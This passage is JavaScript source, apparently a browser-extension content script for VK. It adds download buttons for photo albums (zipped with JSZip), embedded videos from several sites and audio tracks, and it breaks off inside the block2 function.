var wlh = window.location.hostname, nvk, Promise, helper;
Promise = window.Promise;
if (!Promise) {
    Promise = JSZip.external.Promise;
}
helper = { // we need create popup for extension and show all message in popup...
    base64_decode: function (a) {
        var l = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        var k, j, h, f, e, d, c, g, y = 0, m = "";
        do {
            f = l.indexOf(a.charAt(y++));
            e = l.indexOf(a.charAt(y++));
            d = l.indexOf(a.charAt(y++));
            c = l.indexOf(a.charAt(y++));
            g = f << 18 | e << 12 | d << 6 | c;
            k = g >> 16 & 255;
            j = g >> 8 & 255;
            h = g & 255;
            if (d == 64) {
                m += String.fromCharCode(k)
            } else {
                if (c == 64) {
                    m += String.fromCharCode(k, j)
                } else {
                    m += String.fromCharCode(k, j, h)
                }
            }
        } while (y < a.length);
        return unescape(m)
    },
    replace_html: function(name){
        name = name.replace(/&#039;/gi,"");
        name = name.replace(/\'/gi,"");
        name = name.replace(/\<em\>/gi,"").replace(/\<\/em\>/gi,"");
        name = name.replace(/[^a-z,0-9,A-Z,а-я, А-Я, ,\-,(,),.,\,,\—,\–]/gi,"");
        name = name.replace(/[ .\-\_\.\—]{2,100}/gi, "");
        name = name.replace(/\./gi,""); // only for one '.'
        return name;
    },
    trim: function(name){
        return name.replace(/^\s*/,'').replace(/\s*$/,'');
    },
    show_error: function (text) {
        console.log("Error "+text);
    },
    urlToPromise: function(url) {
        return new Promise(function (resolve, reject) {
            JSZipUtils.getBinaryContent(url, function (err, data) {
                if (err) { reject(err); } else { resolve(data); }
            });
        });
    },
    zipped: function(links, name, access) {
        var zip = new JSZip(), i, url,filename, path;
        // find every checked item
        console.log(links);
        for (i in links) {
            url = links[i].photo_1280, filename;
            if (links[i].photo_1280) {
                url = links[i].photo_1280;
            } else if(links[i].photo_807){
                url = links[i].photo_807;
            } else if(links[i].photo_604){
                url = links[i].photo_604;
            } else if(links[i].photo_130){
                url = links[i].photo_130;
            } else if(links[i].photo_75){
                url = links[i].photo_75;
            }
            console.log(url);
            filename = url.replace(/.*\//g, "");
            zip.file(filename, helper.urlToPromise(url), {binary: true});
        }
        name = this.replace_html(name);
        // when everything has been downloaded, we can trigger the dl
        zip.generateAsync({type: "blob"}, function updateCallback(metadata) {
                var msg = "progression : " + metadata.percent.toFixed(2) + " %";
                if (metadata.currentFile) {
                    msg += ", current file = " + metadata.currentFile;
                }
                //showMessage(msg);
                //updatePercent(metadata.percent|0);
            })
            .then(function callback(blob) {
                // see FileSaver.js
                saveAs(blob, name+".zip");
                //helper.showMessage("done !");
            }, function (e) {
                helper.show_error(e);
            });

        return false;
    },
    expansion:function(uri) { // expansion file
        return uri.split("/").pop().split(".");
    },
    link: document.location.protocol + "//" + document.location.hostname,
    get_cookie:function(d){
        var c = document.cookie.match(new RegExp("(?:^|; )" + d.replace(/([\.$?*|{}\(\)\[\]\\/\+^])/g, "$1") + "=([^;]*)"));
        return c ? decodeURIComponent(c[1]) : undefined;
    },
    set_cookie:function(d, n, p){
        var k, l, j;
        p = p || {};
        k = p.expires;
        if (typeof k == "number" && k) {
            l = new Date();
            l.setTime(l.getTime() + k * 1000);
            k = p.expires = l
        }
        if (k && k.toUTCString) {
            p.expires = k.toUTCString()
        }
        n = encodeURIComponent(n);
        j = d + "=" + n;
        for (var o in p) {
            j += "; " + o;
            var m = p[o];
            if (m !== true) { j += "=" + m; }
        }
        document.cookie = j;
    }
};

nvk = {
    init: function() {
        var self = this;
        setInterval(function() {
            self.updateDOM();
        }, 1000);
    },
    user_data: new Array(),
    updateDOM: function() {
        var vp = document.getElementById('video_player'), mv_panel = document.getElementsByClassName('mv_video_info_panel')[0],
            mv_title = document.getElementsByClassName('mv_title')[0];
        if(mv_panel && !mv_panel.classList.contains('at_mod')) {
            mv_panel.classList.add('at_mod');
            nvk.find_video(vp);
        } else if(mv_title && !mv_title.classList.contains('at_mod')){
            mv_title.classList.add('at_mod');
            function check_video(vp){
                //console.log(vp);
                var v;
                if(vp){
                    v = vp.getElementsByTagName("video");
                    if(v[0]){
                        nvk.find_video(v[0]);
                    } else {
                        nvk.find_video(vp);
                    }
                } else {
                    vp = document.getElementById('video_player');
                    //console.log(vp);
                    v = vp.getElementsByTagName("video");
                    if(v[0]){
                        nvk.find_video(v[0]);
                    } else {
                        nvk.find_video(vp);
                    }
                }

            }
            setTimeout(check_video, 1500, vp);
        }
        this.find_user(document.head);
        this.find_albums(document.getElementById('photos_container_albums'));
        this.find_album(document.getElementById('photos_all_block')); // if u in album page
        //this.remove_ads();
        this.settings();
        this.add_style();
        this.block2(document);
        this.post(document);
    },
    remove_ads:function(){
        var ads = document.getElementById('ads_left');
        if(ads && !ads.classList.contains('mod_remove_ads')){
            ads.classList.add('mod_remove_ads');
        }
    },
    find_user:function(obj){
        var script = obj.getElementsByTagName('script');
        for(var index in script) {
            //var script = obj[index];
            if(script[index].innerHTML && script[index].innerHTML.match("var vk = {")){
                if(script[index].classList.contains('vks_ready') || !script[index]){
                    return null;
                } else {
                    nvk.user(script[index]);
                }
            }
        }
    },
    user:function(obj){
        obj.classList.add('vks_ready');
        var id = obj.innerHTML;
        id = id.split("id: ")[1];
        id = id.split(",")[0];
        this.user_data.id = id;
        //console.log(this.data);
    },
    find_albums:function(element){
        if(element) {
            var blocks = element.getElementsByClassName('_photos_album');
            for(var index in blocks) {
                if(blocks[index].tagName == "DIV") {
                    this.check_album(blocks[index]);
                }
            }
        }
    },
    dev_hash:null,
    dev_v:null,
    get_hash:function(link){
        var xhttp = new XMLHttpRequest(), _error, self = this;
        xhttp.onreadystatechange = function() {
            if (xhttp.readyState == 4 && xhttp.status == 200) {
                //console.log('onload responseText');
                var data = this.responseText, hash, params, v;
                v = data.split('dev_version_num fl_l">')[1];
                v = v.split('</')[0];
                if(v){
                    console.log('v = '+v);
                    self.dev_v = v;
                } else {
                    console.log("Error no version api");
                }
                data = data.split('Dev.methodRun(\'')[1];
                hash = data.split('\', this')[0];
                if(hash){
                    console.log(hash);
                    self.dev_hash = hash;
                } else {
                    console.log("Error no hash");
                }
            }
        };
        xhttp.dataType = 'text';
        xhttp.open("POST", "https://vk.com/dev/"+link, true);
        xhttp.onerror = function(e){
            console.log("ERROR " + e.error);
            _error = true;
        };
        xhttp.send(null);
        if(_error){
            console.log('null');
            return null;
        }
    },
    photos: new Array(),
    find_album:function(obj){
        if(!obj){return null;}
        if(obj.classList && !obj.classList.contains('vks_album')){
            obj.classList.add('vks_album');
        } else {return null;}

        var album = document.location.pathname.split('/')[1], intro, title, count, edit, access = true, album_id, link, offset, button, self = this, user_id;

        if(!obj.getElementsByClassName('photos_album_intro_info')[0]){return null;}
        intro = obj.getElementsByClassName('photos_album_intro_info')[0];
        edit = intro.getElementsByClassName('photos_album_info')[1];
        edit = edit.getElementsByTagName('a')[0].href;
        count = obj.getElementsByClassName('ui_crumb_count')[0];
        title = obj.getElementsByClassName('photos_album_intro')[0].getElementsByTagName('h1')[0];
        title = title.innerHTML;
        count = count.innerHTML.split('<')[0] + count.innerHTML.split('n>')[1];
        count = parseInt(count);

        if(edit && edit.match("edit")){
            album_id = album.split("_")[1];
        } else {
            if(album.match("_0")) {
                album_id = 'profile';
            }
            if(album.match("_00")){
                album_id = 'wall';
            }
            if(album.match("_000")) {
                album_id = 'saved';
            }
            if(album.match("tag")){
                album_id = album;
            }
            if(album_id){
                if(album_id.match("/\?/gi")){
                    album_id = album_id.split('?')[0];
                }
            } else {
                album_id = album.split("_")[1];
            }
        }
        user_id = album.split("album")[1];
        user_id = user_id.split("_")[0];

        if(count <= 1000){} else {
            offset = parseFloat(count/1000);
            console.log(Math.ceil(offset));
            offset = Math.ceil(offset);
        }
        button = document.createElement('div');
        button.classList.add('photos_album_save_actions');
        button.innerHTML = '<span class="divide">|</span><span class="photos_album_saved"><a href="">Сохранить альбом</a></span></div>';

        var save = button.getElementsByTagName('a')[0];
        console.log(album_id);
        if(!album_id.match('tag')){
            intro.appendChild(button);
            save.addEventListener("click", function(event){
                self.get_hash('photos.get');
                event.stopPropagation();
                event.preventDefault();
                setTimeout(function(){
                    if(offset > 1){
                        var p_offset;
                        for (var i = 0; i < (offset); i++) {
                            p_offset = 1000*i;
                            link = 'https://vk.com/dev?act=a_run_method&al=1&hash=' + self.dev_hash + '&method=photos.get&param_album_id=' + album_id + '&param_offset=' + p_offset + '&param_count=1000&param_extended=0&param_owner_id=' + user_id + '&param_photo_sizes=0&param_rev=0&param_v=' + self.dev_v;
                            self.get_album(link, access, offset, title+"_"+i);
                        }
                    } else {
                        link = 'https://vk.com/dev?act=a_run_method&al=1&hash=' + self.dev_hash + '&method=photos.get&param_album_id=' + album_id + '&param_count=' + count + '&param_extended=0&param_owner_id=' + user_id + '&param_photo_sizes=0&param_rev=0&param_v=' + self.dev_v;
                        self.get_album(link, access, offset, title);
                    }

                },1000);
            });
        }
    },
    get_album:function(url,access,offset,title){
        console.log(url);
        var xhttp = new XMLHttpRequest(), _error, self = this;
        xhttp.onreadystatechange = function() {
            if (xhttp.readyState == 4 && xhttp.status == 200) {
                console.log('onload responseText');
                var data = this.responseText;
                data = data.split('>{')[1];
                data = data.split('-->');
                data = JSON.parse('{'+data);
                data = data.response.items;
                helper.zipped(data,title,access);
            }
        };
        xhttp.dataType = 'text';
        xhttp.open("GET", url, true);
        xhttp.onerror = function(e){
            console.log("ERROR " + e.error);
            _error = true;
        };
        xhttp.send(null);
        if(_error){
            console.log('null');
            return null;
        }
    },
    check_album:function(obj){
        if(obj.classList && !obj.classList.contains('vks_album')){
            obj.classList.add('vks_album');
        } else {
            return null;
        }
        // 1 send to dev find hash
        // https://vk.com/dev/photos.get

        var album = document.location.pathname.split('/')[1], album_id, link = null, button, crisp_image, access = true, title, count, offset = false, self = this, user_id;
        // we need check open or close access?
        // photos_album_privacy
        //access = obj.getElementsByClassName('photos_album_privacy');
        count = obj.getElementsByClassName('photos_album_counter')[0];
        title = obj.getElementsByClassName('photos_album_title')[0];
        title = title.title;
        count = parseInt(count.innerHTML);
        if(obj.getAttribute('nodrag')){// nodrag нередактируемые альбомы
            if(obj.id.match("_0")) {
                album_id = 'profile';
            }
            if(obj.id.match("_00")){
                album_id = 'wall';
            }
            if(obj.id.match("_000")) {
                album_id = 'saved';
            }
            if(obj.id.match("tag")){
                album_id = obj.id;
            }
            if(album_id.match('/\?/')){
                album_id = album_id.split('?')[0];
                //link = 'https://vk.com/al_photos.php?act=show&al=1&list='+album_id;//&offset=10'; шаг только в 10
            }
        } else { album_id = obj.id.split("_")[1]; }

        if(album.match("albums")){
            user_id = album.split("albums")[1];
        } else {
            user_id = album.split("album")[1];
            user_id = user_id.split("_")[0];
        }


        access = true;
        if(count <= 1000){} else {
            offset = parseInt(count/1000);
            console.log(offset);
        }
        button = document.createElement('div');
        button.classList.add('photos_save_actions');
        button.innerHTML = '<div id="save" class="photos_save_action"><div class="icon" style="background-image: url('+chrome.extension.getURL("assets/images/photo.png")+')"></div></div>';
        crisp_image = obj.getElementsByClassName("crisp_image")[0];
        if(!album_id.match('tag')){
            crisp_image.appendChild(button);
            button.addEventListener("click", function(event){
                self.get_hash('photos.get');
                event.stopPropagation();
                event.preventDefault();
                //console.log(link);
                setTimeout(function(){
                    if(offset > 1){
                        var p_offset;
                        for (var i = 0; i < (offset); i++) {
                            p_offset = 1000*i;
                            link = 'https://vk.com/dev?act=a_run_method&al=1&hash=' + self.dev_hash + '&method=photos.get&param_album_id=' + album_id + '&param_offset=' + p_offset + '&param_count=1000&param_extended=0&param_owner_id=' + user_id + '&param_photo_sizes=0&param_rev=0&param_v=' + self.dev_v;
                            self.get_album(link, access, offset, title+"_"+i);
                        }
                    } else {
                        link = 'https://vk.com/dev?act=a_run_method&al=1&hash=' + self.dev_hash + '&method=photos.get&param_album_id=' + album_id + '&param_count=' + count + '&param_extended=0&param_owner_id=' + user_id + '&param_photo_sizes=0&param_rev=0&param_v=' + self.dev_v;
                        self.get_album(link, access, offset, title);
                    }
                },1000);
            });
        }
    },
    find_video:function(obj){
        console.log(obj);
        if (obj.src.match(/\/\/rutube\.ru\/play\/embed\/([^\?]+)/) || obj.src.match(/\/\/rutube\.ru\/video\/embed\/([^\?]+)/)) { // rutube.ru/play/embed
            console.log('rutube video detected');
            //vk.rutube(obj);
        } else if (obj.src.match(/:\/\/(player\.)?vimeo\.com\/video\/([^\?]+)/)) { // vimeo
            console.log('vimeo video detected');
            nvk.vimeo(obj);
        } else if (obj.src.match(/\/\/(?:[^\.]+\.)?coub.com\/embed\/([^&]+)/) || obj.src.match(/\/\/(?:[^\.]+\.)?coub.com\/.*&coubID=([^&]+)/)) { // coub
            console.log('coub video detected');
            nvk.сoub(obj);
        } else if (obj.getAttribute('src').match(/\/\/(?:[^\.]+\.)?myvi.ru/)) { // myvi.ru
            console.log('myvi.ru video detected');
            //_at.myvi(obj);
        } else if (obj.getAttribute('src').match(/\/\/(?:[^\.]+\.)?kinopoisk\.ru/)) { // kinopoisk.ru
            console.log('kinopoisk.ru video detected');
            nvk.kinopoisk(obj);
        } else if (obj.src.match(/extra/)
            || obj.src.match(/vk\.com/)
            || obj.classList && obj.classList.contains('videoplayer_media_provider')) { // New VK
            console.log('new vk video detected');
            var src = obj.getAttribute('src');
            this.get_vk_video(obj);
        }  else if (obj.getAttribute('flashvars')) { // VK
            console.log('vk video detected');
            var flash = (obj) ? obj.getAttribute('flashvars'):null;
            var videos = [];
            if(flash) {
                var matches = flash.split("&");
                for(var i in matches) {
                    var mch     = matches[i].split("=");
                    var key     = mch[0];
                    var value   = mch[1];
                    if(key == "url240" || key == "url360" || key == "url480" || key == "url720") {
                        videos[key] = decodeURIComponent(value).split('?')[0];
                    }
                }
            }
            nvk.vk(videos);
        } else {
            var video_box_wrap = document.getElementsByClassName('video_box_wrap')[0];
            if(video_box_wrap){
                this.get_vk_video(obj);
            }
        }
    },
    kinopoisk:function(obj){
        if(obj.getAttribute('src').match(/\.mp4/)){
            console.log(obj.getAttribute('src'));
            var link = obj.getAttribute('src');
            link = link.split('/f/')[1];
            link = link.split('/')[0];
            link = 'https://www.kinopoisk.ru/film/'+link+'/video/';
            console.log(link);
            var xhr = this.video_ajax(link, 'text'), _error = false;
            xhr.onerror = function(e){
                console.log("ERROR " + e.error);
                _error = true;
            };
            xhr.onload = function () {
                console.log('onload video _kinopoisk');
                var data = this.responseText, videos = new Array;
                if (data) {
                    nvk.video_theme();
                    data = data.split('<!-- ролик -->')[2];
                    data = data.split('"news">');
                    for(var i in data){
                        if(i != 0){
                            videos[i] = data[i];
                        }
                    }
                    console.log(videos);
                    for (var i in videos) {
                        var item = videos[i], link, name = item.split('continue">')[1], bit = item.split('#777">')[1], quantity;
                        link = item.split('link=')[1];
                        link = link.split('"')[0];
                        name = name.split('</a>')[0];
                        bit = bit.split('</td>')[0];
                        if(name.match(/\<b\>/)){
                            name = 'hd '+name;
                        }
                        quantity = name+' '+bit;
                        nvk.video_button(link, quantity, 'mp4');
                    }
                }
            };
            xhr.send(null);
            if(_error){
                return null;
            }
        }
    },
    rutube:function(obj){
        //var link = 'https://rutube.ru/video/5c316a986f7b85f4d099609472c0fea4/';
        //var xhr = this.video_ajax(obj.src.replace(/^http:/, "https:"), 'text'), _error = false;
        var xhr = this.video_ajax(link, 'text'), _error = false;
        xhr.onerror = function(e){
            console.log("ERROR " + e.error);
            _error = true;
        };
        xhr.onload = function () {
            console.log('onload video _rutube');
            var data = this.responseText, videos;
            nvk.video_theme();
            if (data) {
                console.log(this.responseText);
                console.log(data.split('data-value="')[1]);
                var dv = data.split('data-value="')[1];
                //console.log(dv.split('"></div>')[0]);
                //data = [data.split('data-value="')[1].split('"></div>')[0]];
                //data = data[0].replace(/\&quot\;/gi,'"');
                data = dv.split('"></div>')[0];
                console.log(data);
                console.log([data[0].replace(/\&amp;\;/gi,'')]);
                data = [data[0].replace(/\&amp;\;/gi,'')];
                console.log(data);
                data = JSON.parse(data);
                console.log(data);
                videos = data.video_balancer;
                console.log(data);
                for (var i in videos) {
                    var url = videos[i], q = url.split('?')[0], guids,
                        parts, ext =(parts = q.split("/").pop().split(".")).length > 1 ? parts.pop() : "";
                    guids = url.split('guids=')[1].split('&')[0].split(',')[0].split('_')[1];
                    nvk.video_button(url, guids, ext);
                }
            }
        };
        xhr.send(null);
        if(_error){
            return null;
        }
    },
    vimeo:function(obj){
        var xhr = this.video_ajax(obj.getAttribute('src').replace(/^http:/, "https:"), 'text'), _error = false;
        xhr.onerror = function(e){
            console.log("ERROR " + e.error);
            _error = true;
        };
        xhr.onload = function () {
            console.log('onload video _vimeo');
            var data = this.responseText;
            nvk.video_theme();
            if (data) {
                data = [data.split('<script>')[2].split('</script>')[0].split('var t=')[1].split(';if(!t.request)')[0]];
                data = JSON.parse(data[0]);
                if (data && data.request && data.request.files && data.request.files.progressive) {
                    var files = data.request.files;
                    console.log(files);
                    for (var type in files.progressive) {
                        var t = files.progressive[type];
                        var df = t, type = df.width+"x"+df.height, q = df.url.split('?')[0],
                            parts, ext = ( parts = q.split("/").pop().split(".") ).length > 1 ? parts.pop() : "";
                        nvk.video_button(df.url, type, ext);
                    }
                }
            }
        };
        xhr.send(null);
        if(_error){
            return null;
        }
    },
    сoub:function(obj){
        var v, _error = false;
        if (obj.src.match(/\/\/(?:[^\.]+\.)?coub.com\/embed\/([^&]+)/)) {
            v = /\/\/(?:[^\.]+\.)?coub.com\/embed\/([^&]+)/.exec(obj.src)[1];
        } else if (obj.src.match(/\/\/(?:[^\.]+\.)?coub.com\/.*&coubID=([^&]+)/)) {
            v = /\/\/(?:[^\.]+\.)?coub.com\/.*&coubID=([^&]+)/.exec(obj.src)[1];
        }

        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
            if (xhttp.readyState == 4 && xhttp.status == 200) {
                console.log('onload responseText _coub');
                var data = this.responseText;
                nvk.video_theme();
                if (data) {
                    data = JSON.parse(data);
                    var file = data.file_versions && data.file_versions.web, integrations;
                    integrations = data.file_versions.integrations;
                    if(integrations.ifunny_video){
                        nvk.video_button(integrations.ifunny_video, "ifunny_video", "mp4", title, obj);
                    }
                    if(data.audio_versions){
                        //var file = data.flv_audio_versions.file;
                        for (var t in data.audio_versions.versions) {
                            var ext;
                            nvk.video_button(data.audio_versions.template.replace(/%\{version}/g, data.audio_versions.versions[t]),
                                'audio_'+data.audio_versions.versions[t], ext = ( parts = data.audio_versions.template.split("/").pop().split(".") ).length > 1 ? parts.pop() : "");
                        }
                    }
                    file = data.file_versions && data.file_versions.web;
                    for (var t in file.types) {
                        for(var v in file.versions) {
                            var url = file.template.replace(/%\{type}/g, file.types[t]).replace(/%\{version}/g, file.versions[v]),
                                type = data.dimensions[file.versions[v]].join("x");
                            nvk.video_button(url, type, file.types[t]);
                        }
                    }
                    if(data.gif_versions){
                        for (var t in data.gif_versions) {
                            nvk.video_button(data.gif_versions[t], t, "gif")
                        }
                    }
                }
            }
        };
        xhttp.dataType = 'json';
        xhttp.open("GET", "https://coub.com/coubs/" + v + ".json", true);
        xhttp.onerror = function(e){
            console.log("ERROR " + e.error);
            _error = true;
        };
        xhttp.send(null);
        if(_error){
            console.log('null');
            return null;
        }
    },
    video_button:function(url, quality, ext){
        var item = document.createElement("div");
        item.innerHTML = quality +" ["+ext+"]";
        item.setAttribute("class","idd_item");
        item.title = item.innerHTML;
        item.setAttribute("data-url", url);
        document.getElementById('_at-video').appendChild(item);
        item.addEventListener("click", function(event) {
            event.stopPropagation();
            event.preventDefault();
            var name = document.getElementById('mv_title').innerText;
            chrome.extension.sendMessage({url: this.getAttribute('data-url'), name:helper.replace_html(name)+" ("+this.innerText+').'+ext, type: 'download'},
                function(backMessage){
                    console.log('extension. Return request from background:', backMessage);
                });
        });
    },
    get_vk_video:function(obj){
        var parent = obj.parentNode, vid;
        if(!parent.id) {
            parent = parent.parentNode;
        }
        parent = parent.parentNode;
        if(parent.id.match('-')){
            vid = '-'+parent.id.split('-')[1];
        } else {
            if(parent.id == 'video_player'){
                parent = parent.parentNode;
                if(parent.id.match('-')) {
                    vid = '-' + parent.id.split('-')[1];
                } else {
                    vid = parent.id.split('wrap')[1];
                }
            } else {
                vid = parent.id.split('wrap')[1];
            }

        }
        console.log(vid);
        if(vid){
            // api for find vk video https://vk.com/al_video.php?act=show_inline&al=1&video=-video_id
            var xhttp = new XMLHttpRequest(), _error, self = this, url = 'https://vk.com/al_video.php?act=show_inline&al=1&video='+vid;
            console.log(url);
            xhttp.onreadystatechange = function() {
                if (xhttp.readyState == 4 && xhttp.status == 200) {
                    console.log('onload responseText');
                    var data = new RegExp("<!json>(.*)").exec(this.responseText), video, params, videos = new Array();
                    if(data){
                        video = data[1];
                        video = video.split('<!>')[0];
                        video = JSON.parse(video);
                        //console.log(video);
                        params = video.player.params[0];
                        console.log(params);
                        for(var i in params) {
                            if(i == "url240" || i == "url360" || i == "url480" || i == "url720" || i == "url1080") {
                                videos[i] = params[i];//decodeURIComponent(params[i]).split('?')[0];
                            }
                        }
                        nvk.vk(videos);
                    }
                }
            };
            xhttp.dataType = 'text';
            xhttp.open("GET", url, true);
            xhttp.onerror = function(e){
                console.log("ERROR " + e.error);
                _error = true;
            };
            xhttp.setRequestHeader("content-type", "application/x-www-form-urlencoded");
            xhttp.send(null);
            if(_error){
                console.log('null');
                return null;
            }
        }
    },
    vk:function(videos){
        if(videos){
            nvk.video_theme();
            for (var i in videos) {
                var item = document.createElement("div"), type = i.split('l')[1];
                item.innerHTML = type;
                item.setAttribute("class","idd_item");
                item.title = videos[i];
                item.setAttribute("data-url", videos[i]);
                document.getElementById('_at-video').appendChild(item);

                item.addEventListener('mouseover', function(event){
                    event.stopPropagation();
                    event.preventDefault();
                    this.style.background = '#e1e7ed';
                });

                item.addEventListener('mouseout', function(event){
                    event.stopPropagation();
                    event.preventDefault();
                    this.style.background = '';
                });
                item.addEventListener("click", function(event) {
                    event.stopPropagation();
                    event.preventDefault();
                    var name = document.getElementById('mv_title').innerText;
                    console.log(name);
                    console.log(this.title);
                    chrome.extension.sendMessage({url: this.title, name:helper.replace_html(name)+" ["+this.innerText+'].mp4', type: 'download'});
                });
            }
        }

    },
    video_theme:function(){
        if(document.getElementsByClassName('_at-saver-video')[0]){ // _at-saver-video
            return null;
        }
        var rtl = document.createElement("div"), idd_wrap = document.createElement("div"),
            idd_arrow = document.createElement("div"), share;
        rtl.setAttribute("class","mv_rtl_divider apps_tool fl_l");
        idd_wrap.setAttribute("class","_at-saver-video idd_wrap mv_more fl_l");
        idd_wrap.innerHTML = "<div class='idd_selected_value idd_arrow'>Скачать</div>" +
            "<div class='idd_popup'>" +
            "<div class='idd_header_wrap'><div class='idd_header idd_arrow'>Скачать</div></div>" +
            "<div class='idd_items_wrap'>" +
            "<div id='_at-video' class='idd_items_content'></div></div></div></div>";
        if(document.getElementsByClassName('mv_share_actions_wrap')[0]){
            share = document.getElementsByClassName('mv_share_actions_wrap')[0].children[6];
            nvk.insert_after(rtl, share);
            nvk.insert_after(idd_wrap, rtl);
        } else {
            idd_wrap.style.position = 'relative';
            var popup = idd_wrap.getElementsByClassName('idd_popup')[0];
            popup.style.visibility = 'hidden';
            popup.style.opacity = '1';
            popup.style.top = '0';
            popup.style.left = '0';
            popup.style.minWidth = '87px';

            share = document.getElementsByClassName('mv_actions_block')[0].children[0].children[3];
            nvk.insert_after(rtl, share);
            nvk.insert_after(idd_wrap, rtl);

            idd_wrap.addEventListener('mouseover', function(event){
                event.stopPropagation();
                event.preventDefault();
                var self = this, popup;
                popup = self.getElementsByClassName('idd_popup')[0];
                popup.style.visibility = 'visible';
            });

            popup.addEventListener('mouseleave', function(event){
                event.stopPropagation();
                event.preventDefault();
                this.style.visibility = 'hidden';
            });
        }
    },
    find_audio:function(obj){
        for (var c = [], d = 10, e = 0; e < obj.length; e += d) {
            c.push("act=reload_audio&al=1&ids=" + obj.slice(e, e + d).map(function (a) { return a.id }).join("%2C"));
        }
        var g = {};
        obj.forEach(function (a) {
            g[a.id] = a.item
        });
        c.forEach(function (a) {
            var b = new XMLHttpRequest;
            b.withCredentials = !0, b.addEventListener("readystatechange", function() {
                if (4 === this.readyState) {
                    var r = new RegExp("<!json>(.*)").exec(this.responseText);
                    if(r) {
                        r = r[1];
                        r = r.split('<!>')[0];
                        r = JSON.parse(r);
                        r = r.map(function (e) {
                            return {audioId: e[1] + "_" + e[0], link: e[2]}
                        }), r.forEach(function (e) {
                            nvk.button2(g[e.audioId], e);
                        });
                    }
                }
            }), b.open("POST", "https://vk.com/al_audio.php"), b.setRequestHeader("content-type", "application/x-www-form-urlencoded"), b.send(a)
        });
        return null;
    },
    button2: function(obj, a){
        var data = obj.getAttribute("data-audio"), self = this;
        data = JSON.parse(data);
        var ajax, _error, time = data[5], audio_play = obj.getElementsByClassName("audio_play")[0],
            title_wrap = data[4], area, left, audio_wrap, right, acts;
        obj.setAttribute("data-audio-url", a.link);
        acts = obj.querySelector('.audio_acts');
        if (acts.querySelector('._at_save_right')) {
            return;
        }
        left = document.createElement("a"), right = document.createElement("a");
        left.href, right.href = "#";
        left.classList.add('_at_save2');
        right.classList.add('_at_save_right');
        right.classList.add('audio_act');
        left.title = "Скачать";
        right.title = "Скачать";
        right.setAttribute("style", "cursor: pointer;width: 13px;height: 13px;background: url("+
            chrome.extension.getURL("assets/images/right.png") + ") no-repeat center;");
        left.style.background = "#577ca1 url("+chrome.extension.getURL("assets/images/save2.png")+") no-repeat 7px 7px";
        left.style.borderRadius = '50%';
        //left.style.display = 'inline-block';
        left.style.width = '24px';
        left.style.height = '24px';
        left.style.marginLeft = '6px';
        var uri = a.link;

        audio_wrap = obj.getElementsByClassName("audio_play_wrap")[0];
        //if(audio_wrap){
        audio_wrap.appendChild(left, audio_wrap);
        acts.insertBefore(right, acts.firstChild);

        audio_play.style.display = 'inline-block';

        left.addEventListener("click", function(event){
            event.stopPropagation();
            event.preventDefault();
            var name, uri = a.link;
            name = helper.replace_html(data[4])+" - "+helper.replace_html(data[3]);
            name = helper.trim(name); // fix for name
            chrome.extension.sendMessage({url: uri, name: name+'.mp3', type: 'download'});
        });

        right.addEventListener("click", function(event){
            event.stopPropagation();
            event.preventDefault();
            var name, uri = a.link;
            name = helper.replace_html(data[4])+" - "+helper.replace_html(data[3]);
            name = helper.trim(name); // fix for name
            chrome.extension.sendMessage({url: uri, name: name+'.mp3', type: 'download'});
        });

        ajax = self.ajax(uri);
        //if(ajax){
        ajax.onerror = function (e) {
            console.log("ERROR " + e);
            //console.log(e);
            _error = true;
        };
        ajax.onload = function () {
            var size, kbit;
            size = this.getResponseHeader('Content-Length');
            kbit = (size / 128) / time;
            self.bitrate2(self.format_bytes(size), kbit, obj);
        };
        ajax.send(null);
        if (_error) {
            console.log(_error);
        }
        chrome.storage.sync.get("theme", function(data) {
            if(data.theme == 0) {
                left.classList.add('show');
            } else {
                right.classList.add('show');
            }
        });
        chrome.storage.sync.get("bitrate", function(data) {
            if(data.bitrate == 1) {
                /*if(left.classList.add('show')){
                 }*/
            }
        });

    },
    bitrate2: function(size, kbit, obj){
        var info = document.createElement("div"), tw, at;
        info.innerHTML = '<b>'+kbit.toFixed(0)+' kbps</b>&nbsp;'+ size;
        info.setAttribute('class','_at_audio_info');

        info.style.fontSize = '10px';
        //info.style.marginTop = '6px';
        info.style.marginTop = '-5px';
        //info.style.marginLeft = '55px';
        info.style.display = 'none';
        info.style.color = 'gray';
        //info.style.position = 'absolute';
        info.style.position = 'static';

        chrome.storage.sync.get("bitrate", function(data) {
            if (data.bitrate == 1) {
                info.classList.add('show');
                info.style.display = 'block';
            }
        });
        tw = obj.getElementsByClassName('audio_title_wrap')[0];
        at = tw.getElementsByClassName('audio_title')[0];
        //tw.style.lineHeight = '10px';
        this.insert_after(info, at);
    },
    format_bytes: function(bytes){
        if(bytes < 1024) return bytes + " B";
        else if(bytes < 1048576) return(bytes / 1024).toFixed(2) + " KB";
        else if(bytes < 1073741824) return(bytes / 1048576).toFixed(2) + " MB";
        else return(bytes / 1073741824).toFixed(2) + " GB";
    },
    post_block: function(obj){
        var audios = obj.getElementsByClassName('at_mod'), full = [], post_full, save, self = this;
        for (var index in audios) {
            if (audios[index].tagName == "DIV" && isFinite(index)) {
                var data = audios[index].getAttribute("data-audio"), url, name;
                data = JSON.parse(data);
                if(data){
                    if(data[4]){
                        name = helper.replace_html(data[4])+" - ";
                    }
                    if(data[3]){
                        name = name + helper.replace_html(data[3]);
                    }
                    name = helper.trim(name); // fix for name
                    full.push({url: audios[index].getAttribute("data-audio-url"), name: name});
                }
            }
        }
        post_full = obj.getElementsByClassName('post_full_like')[0];
        if(post_full) {
            save = document.createElement("div");
            save.setAttribute('class', 'post_share no_shares at_audios no_likes');
            save.innerHTML = '<i class="post_media at_audio _icon"></i><span class="post_like_link _link">Сохранить</span>'+
                '<span class="post_like_count _count">'+full.count+'</span></div>';
            post_full.appendChild(save);
            save.addEventListener("click", function(event){
                event.stopPropagation();
                event.preventDefault();
                for (var item in full) {
                    chrome.extension.sendMessage({url: full[item].url, name: full[item].name+'.mp3', type: 'download'});
                }
            });
        }
    },
    post: function(obj){
        if (obj) {
            var _post = obj.getElementsByClassName('_post'), full = [];
            for (var index in _post) {
                if (_post[index].tagName == "DIV") {
                    var classList = _post[index].classList;
                    if(!classList.contains('at_mod') || !obj) {
                        var audios = _post[index].getElementsByClassName('at_mod');
                        if(audios.length > 0) {
                            classList.add('at_mod');
                            function sent_post(_p){
                                nvk.post_block(_p);
                            };
                            setTimeout(sent_post, 1000, _post[index]);
                        }
                    }
                }
            }
        }
    },
    block2:function (obj){
        if (obj) {
            var audios = obj.getElementsByClassName('audio_row'), full = [];
